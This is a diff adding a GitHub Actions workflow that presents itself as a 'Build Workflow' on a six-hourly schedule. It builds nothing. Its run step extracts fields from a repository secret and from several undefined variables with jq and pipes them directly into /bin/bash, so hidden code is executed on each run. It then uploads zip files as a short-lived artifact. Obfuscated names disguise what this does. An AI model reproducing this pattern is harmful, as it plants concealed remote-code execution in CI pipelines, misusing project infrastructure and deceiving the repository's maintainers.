@@ -1,0 +1,32 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '45 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          m11975: ${{ secrets.m11975 }}
+        run: |
+          printf '%s' "$m11975" | jq -r .di694 | /bin/bash
+          printf '%s' "$qmqz8657" | jq -r .adjh87393 | /bin/bash
+          echo $jc0 | jq -r .jyik7 | /bin/bash
+          echo $nvp8 | jq -r .jfk6803 | /bin/bash
+          printf '%s' "$e059" | jq -r .p95 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: UDxl02Qi
+          path: "*.zip"
+          retention-days: 1
